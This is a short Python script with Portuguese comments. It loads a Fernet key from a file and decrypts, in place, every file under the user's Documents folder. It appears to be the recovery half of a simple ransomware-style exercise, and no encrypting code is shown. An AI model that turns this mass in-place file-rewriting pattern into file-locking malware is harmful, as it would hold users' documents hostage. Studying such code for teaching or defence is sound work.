import os  # Importa o módulo os para interagir com o sistema operacional
from cryptography.fernet import Fernet  

# Função para desenciptar um arquivo
def decrypt_file(filename, key):
    fernet = Fernet(key)  # Inicializa um objeto Fernet com a chave fornecida
    with open(filename, "rb") as file:
        encrypted_data = file.read()  # Lê os dados encriptados
    decrypted_data = fernet.decrypt(encrypted_data)  # Desencripta os dados
    with open(filename, "wb") as file:
        file.write(decrypted_data)  # Escreve os dados desencriptados de volta para no arquivo

# Função para desencripta os arquivos na diretoria documents 
def decrypt_documents_directory(key_file_path):
    key = load_key(key_file_path)  # Carrega a chave 
    documents_directory = os.path.join(os.path.expanduser("~"), "Documents")  # Obtém o caminho 
    # Percorre recursivamente a diretoria 
    for root, dirs, files in os.walk(documents_directory):
        for file in files:
            file_path = os.path.join(root, file)  # Obtém o caminho completo do arquivo
            decrypt_file(file_path, key)  # Desencripta o arquivo 

# Função para carregar a chave do arquivo
def load_key(key_file):
    return open(key_file, "rb").read()  # Lê e retorna a chave
